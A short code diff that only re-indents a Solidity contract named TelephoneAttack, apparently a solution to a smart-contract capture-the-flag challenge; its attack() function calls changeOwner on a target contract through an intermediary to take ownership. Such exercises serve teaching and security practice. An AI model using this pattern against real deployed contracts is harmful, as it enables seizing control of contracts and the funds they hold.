@@ -7,10 +7,10 @@ contract TelephoneAttack {
     Telephone public telephone;
 
     constructor(address _telephoneAddress) {
-	telephone = Telephone(_telephoneAddress);
+        telephone = Telephone(_telephoneAddress);
     }
 
     function attack() public {
-	telephone.changeOwner(msg.sender);
+        telephone.changeOwner(msg.sender);
     }
 }
